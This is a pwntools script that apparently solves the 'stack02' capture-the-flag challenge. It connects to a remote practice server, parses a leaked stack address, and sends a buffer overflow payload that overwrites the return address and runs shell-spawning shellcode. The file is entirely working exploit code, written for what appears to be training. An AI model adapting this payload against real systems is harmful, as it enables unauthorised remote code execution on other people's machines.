from pwn import *


def stack02():
    # r = process('/home/was_4/Downloads/stack02')
    context.binary = '/home/was_4/Downloads/stack02'
    r = remote(host='pwnable.hso-hacker.space', port=20002)
    # gdb.attach(r.pid)

    data = r.recvline().decode()
    print(data)

    address = re.findall(r'0x([a-f0-9]+)', data)[0]
    addressToJump = int(address, 16)

    payload = b'A' * 0x18 + struct.pack('<Q', addressToJump + 32) + asm(shellcraft.sh())
    # payload = b'A' * 0x18 + p64(addressToJump + 32) + asm(shellcraft.sh())

    r.sendline(payload)
    r.interactive()


if __name__ == '__main__':
    stack02()
